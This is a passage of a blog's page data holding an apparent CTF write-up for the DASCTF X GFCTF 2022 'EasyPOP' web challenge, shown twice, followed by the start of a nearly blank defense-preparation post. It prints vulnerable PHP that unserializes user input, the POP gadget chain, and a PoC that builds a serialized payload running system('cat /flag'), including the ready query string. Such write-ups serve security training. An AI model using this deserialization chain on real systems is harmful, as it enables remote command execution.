class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setPassword</span>(<span class=\"params\"><span class=\"variable\">$password</span></span>): <span class=\"title\">void</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">secret_code</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$code</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">secret</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include_once</span> <span class=\"string\">&quot;hint.php&quot;</span>;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">hint</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$arguments</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$num</span> = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$num</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;code-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pop&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pop&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$a</span>-&gt;<span class=\"title function_ invoke__\">setPassword</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>()));</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">show</span>(<span class=\"string\">&quot;Ctfer&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>-&gt;<span class=\"title function_ invoke__\">show</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Ctfer: Duration of practice: Two <span class=\"keyword\">and</span> a half years</span><br></pre></td></tr></table></figure>\n\n<p><code>fine::invoke</code></p>\n<p><code>$a = unserialize($_GET[&#39;pop&#39;]);</code><strong></strong><strong>pop</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fine::__invoke() &lt;- sorry::__get() &lt;- secret_code::show() &lt;- secret_code::__call() &lt;- show::__toString() &lt;- sorry::__destruct() </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><strong>poc</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class fine</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $cmd;</span><br><span class=\"line\">    public $content;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class secret_code</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $code;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class show</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $ctf;</span><br><span class=\"line\">    public $time;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class sorry</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">    public $password;</span><br><span class=\"line\">    public $hint;</span><br><span class=\"line\">    public $key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$sorry = new sorry();</span><br><span class=\"line\">$sorry2 = new sorry();</span><br><span class=\"line\">$show = new show();</span><br><span class=\"line\">$secret_code = new secret_code();</span><br><span class=\"line\">$fine = new fine();</span><br><span class=\"line\">$sorry-&gt;hint = $show;</span><br><span class=\"line\">$show-&gt;ctf = $secret_code;</span><br><span class=\"line\">$secret_code-&gt;code = $sorry2;</span><br><span class=\"line\">$sorry2-&gt;key = $fine;</span><br><span class=\"line\">$fine-&gt;cmd = &#x27;system&#x27;;</span><br><span class=\"line\">$fine-&gt;content = &#x27;cat /flag&#x27;;</span><br><span class=\"line\">echo serialize($sorry);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">//wakeup</span><br><span class=\"line\">//?pop=O:5:&quot;sorry&quot;:4:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;s:4:&quot;hint&quot;;O:4:&quot;show&quot;:2:&#123;s:3:&quot;ctf&quot;;O:11:&quot;secret_code&quot;:1:&#123;s:4:&quot;code&quot;;O:5:&quot;sorry&quot;:4:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;s:4:&quot;hint&quot;;N;s:3:&quot;key&quot;;O:4:&quot;fine&quot;:3:&#123;s:3:&quot;cmd&quot;;s:6:&quot;system&quot;;s:7:&quot;content&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;s:4:&quot;time&quot;;N;&#125;s:3:&quot;key&quot;;N;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"DASCTF-X-GFCTF-2022\"><a href=\"#DASCTF-X-GFCTF-2022\" class=\"headerlink\" title=\"DASCTF X GFCTF 2022\"></a>DASCTF X GFCTF 2022</h1><h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"1-EasyPOP\"><a href=\"#1-EasyPOP\" class=\"headerlink\" title=\"1.EasyPOP\"></a>1.EasyPOP</h3><p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fine</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$cmd</span>, <span class=\"variable\">$content</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cmd = <span class=\"variable\">$cmd</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;content = <span class=\"variable\">$content</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;cmd, <span class=\"variable\">$this</span>-&gt;content);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cmd = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">show</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$ctf</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$time</span> = <span class=\"string\">&quot;Two and a half years&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$ctf</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;ctf = <span class=\"variable\">$ctf</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;ctf-&gt;<span class=\"title function_ invoke__\">show</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>): <span class=\"title\">string</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;ctf . <span class=\"string\">&quot;: Duration of practice: &quot;</span> . <span class=\"variable language_\">$this</span>-&gt;time;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sorry</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$hint</span> = <span class=\"string\">&quot;hint is depend on you&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$key</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$password</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;hint = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">secret_code</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"variable language_\">$this</span>-&gt;key;</span><br><span class=\"line\">        <span class=\"variable\">$name</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password == <span class=\"variable language_\">$this</span>-&gt;name) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;hint;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;jay&quot;</span>) &#123;</span><br><span class=\"line\">            secret_code::<span class=\"title function_ invoke__\">secret</span>();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;This is our code&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getPassword</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setPassword</span>(<span class=\"params\"><span class=\"variable\">$password</span></span>): <span class=\"title\">void</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">secret_code</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$code</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">secret</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include_once</span> <span class=\"string\">&quot;hint.php&quot;</span>;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">hint</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$arguments</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$num</span> = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"variable\">$num</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;code-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pop&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pop&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$a</span>-&gt;<span class=\"title function_ invoke__\">setPassword</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>()));</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">show</span>(<span class=\"string\">&quot;Ctfer&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>-&gt;<span class=\"title function_ invoke__\">show</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Ctfer: Duration of practice: Two <span class=\"keyword\">and</span> a half years</span><br></pre></td></tr></table></figure>\n\n<p><code>fine::invoke</code></p>\n<p><code>$a = unserialize($_GET[&#39;pop&#39;]);</code><strong></strong><strong>pop</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fine::__invoke() &lt;- sorry::__get() &lt;- secret_code::show() &lt;- secret_code::__call() &lt;- show::__toString() &lt;- sorry::__destruct() </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><strong>poc</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class fine</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $cmd;</span><br><span class=\"line\">    public $content;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class secret_code</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $code;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class show</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $ctf;</span><br><span class=\"line\">    public $time;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class sorry</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $name;</span><br><span class=\"line\">    public $password;</span><br><span class=\"line\">    public $hint;</span><br><span class=\"line\">    public $key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$sorry = new sorry();</span><br><span class=\"line\">$sorry2 = new sorry();</span><br><span class=\"line\">$show = new show();</span><br><span class=\"line\">$secret_code = new secret_code();</span><br><span class=\"line\">$fine = new fine();</span><br><span class=\"line\">$sorry-&gt;hint = $show;</span><br><span class=\"line\">$show-&gt;ctf = $secret_code;</span><br><span class=\"line\">$secret_code-&gt;code = $sorry2;</span><br><span class=\"line\">$sorry2-&gt;key = $fine;</span><br><span class=\"line\">$fine-&gt;cmd = &#x27;system&#x27;;</span><br><span class=\"line\">$fine-&gt;content = &#x27;cat /flag&#x27;;</span><br><span class=\"line\">echo serialize($sorry);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">//wakeup</span><br><span class=\"line\">//?pop=O:5:&quot;sorry&quot;:4:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;s:4:&quot;hint&quot;;O:4:&quot;show&quot;:2:&#123;s:3:&quot;ctf&quot;;O:11:&quot;secret_code&quot;:1:&#123;s:4:&quot;code&quot;;O:5:&quot;sorry&quot;:4:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;s:4:&quot;hint&quot;;N;s:3:&quot;key&quot;;O:4:&quot;fine&quot;:3:&#123;s:3:&quot;cmd&quot;;s:6:&quot;system&quot;;s:7:&quot;content&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;s:4:&quot;time&quot;;N;&#125;s:3:&quot;key&quot;;N;&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"HW prepare","date":"2023-04-12T13:20:31.000Z","excerpt":"HW prepare","_content":"\n# HW prepare\n\n### hw\n\n\n\nhw\n\n\n\n### hw\n\nWAFIPS7*24\n\n\n\nIP\n\n\n\n\n\n### \n\n- \n- DDDOS\n- GLBLLBSLBGLBLLBSLB\n- WAF[web](https://cloud.tencent.com/product/waf?from=20065&from_column=20065)WEB\n- \n- [](https://cloud.tencent.com/product/vds?from=20065&from_column=20065)WEB\n- WAFwebWEB\n- \n- ICT\n\n### 